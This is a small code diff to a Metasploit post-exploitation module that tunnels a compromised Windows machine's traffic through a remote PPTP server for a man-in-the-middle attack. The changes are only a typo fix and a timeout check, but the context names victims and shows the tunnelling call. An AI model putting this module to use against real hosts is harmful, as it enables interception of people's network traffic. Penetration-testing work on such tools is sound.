@@ -16,7 +16,7 @@ class Metasploit3 < Msf::Post
 		super( update_info( info,
 			'Name'          => 'Windows Manage Remote Point-to-Point Tunneling Protocol',
 			'Description'   => %q{
-					This module iniciates a PPTP connection to a remote machine (VPN server). Once the
+					This module initiates a PPTP connection to a remote machine (VPN server). Once the
 				tunnel is created we can use it to force the victim traffic to go through the server getting
 				a man in the middle attack. Be sure to allow forwarding and masquerading in the server},
 			'License'       => MSF_LICENSE,
@@ -45,7 +45,7 @@ class Metasploit3 < Msf::Post
 		disable_network_wizard if sysinfo["OS"] =~ /Windows 7|Vista|2008/
 
 		pbk = create_pbk(datastore['MIM'],datastore['PBK_NAME'])
-		to = (datastore['TIMEOUT'].zero?) ? 60 : datastore['TIMEOUT']
+		to = (datastore['TIMEOUT'] <= 0 ) ? 60 : datastore['TIMEOUT']
 		begin
 			::Timeout.timeout(to) do
 			run_rasdial(pbk,datastore['USERNAME'],datastore['PASSWORD'],datastore['CONNECTION_NAME'],datastore['RHOST'],datastore['PBK_NAME'])
